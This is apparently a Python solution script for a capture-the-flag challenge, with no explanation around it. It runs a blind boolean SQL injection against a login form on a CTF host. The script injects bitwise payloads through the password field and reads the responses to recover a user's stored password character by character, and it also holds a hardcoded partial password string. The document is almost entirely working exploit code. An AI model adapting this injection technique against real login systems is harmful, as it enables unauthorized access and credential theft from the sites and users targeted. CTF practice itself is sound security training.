import requests

url = "http://tasks.ctfd.kncyber.pl:7017/"

email = "jeju" 

flag = [1,2,4,8,16,32,64]
out = 0
password = "g8gGIiCNEtV7d3+Dkrq/87IsrlmP3ho4"

a = len(password) + 1

while True:
    for element in flag:
        p = "' or (binary '" + str(element) + "' & ascii(substr((select pass from users where email = '" + email + "')," + str(a) + ",1))) = binary '" + str(element) + "' -- "
        output = requests.post(url, data = {"email" : email , "pass" : p, "action" : "Zaloguj się"}).text
        if "Witaj" in output:
            out = out | element
   
    if out == 0:
        break
    password += chr(out)
    print(password)
    out = 0
    a += 1

print("password: " + password)
